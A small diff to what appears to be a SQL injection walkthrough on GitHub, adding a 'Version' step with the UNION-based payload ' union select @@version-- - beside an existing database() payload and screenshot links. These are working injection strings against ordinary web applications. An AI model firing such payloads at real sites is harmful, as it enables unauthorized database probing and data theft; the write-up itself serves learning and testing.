@@ -60,5 +60,10 @@ Payload: ' union select database()-- -
 
 ![image](https://user-images.githubusercontent.com/79543461/177163576-b903824d-3109-4143-b421-39d210096c0e.png)
 
+**Version**
+
+Payload: ' union select @@version-- -
+
+![image](https://user-images.githubusercontent.com/79543461/177164063-41a93070-b0fc-4cfc-8592-f87ac3f97f96.png)
 
 
